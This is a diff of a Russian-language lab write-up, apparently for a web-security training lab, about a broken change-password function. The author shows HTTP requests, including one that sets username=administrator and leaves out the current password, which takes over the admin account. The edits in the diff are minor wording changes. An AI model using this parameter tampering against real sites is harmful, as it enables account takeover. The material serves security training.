@@ -7,14 +7,14 @@
 получите доступ к `administrator` учетная запись и удаление пользователя `carlos`
 
 -----
-базар там про то, что программисты (не все ) (или просто ленивые попы) (я сам ios-ер) доверяют тому, что приходит от юзера. Типа, если в запросе прилетело `"admin": true` или `"role": "administrator"`, они такие: "О, ну значит он админ, пускай всё хуярит"
+базар там про то, что программисты (не все ) (или просто ленивые попы которые) доверяют тому, что приходит от юзера. Типа, если в запросе прилетело `"admin": true` или `"role": "administrator"`, они такие: "О, ну значит он админ, пускай всё хуярит"
 
 
 ------
 
 в лабе вижу - что есть функциональность - смена пароля, смена емейла
 
-вот запрос который меняет пароль
+вот запрос который меняет пароль изнутри своего аккаунта
 
 ```http
 POST /my-account/change-password HTTP/2
@@ -42,7 +42,7 @@ Priority: u=0, i
 csrf=ljg1m6AQVKSVS5xkPrdaKLwAWejyIFcd&username=wiener&current-password=peter&new-password-1=123&new-password-2=123
 ```
 
-вводим ник (зачем-то)
+
 вводим старый пароль + дважды новый пароль
 
 может можно как-то сменить пароль другому юзеру? 
@@ -77,6 +77,8 @@ Accept-Encoding: gzip, deflate, br
 Priority: u=0, i
 
 csrf=ljg1m6AQVKSVS5xkPrdaKLwAWejyIFcd&username=administrator&new-password-1=123&new-password-2=123
+
+
 ```
 
 <img src="../../assets/frfrg542026-02-279.09.10.png" alt="Скрин" style="width: 90%; max-width: 1000px;" />
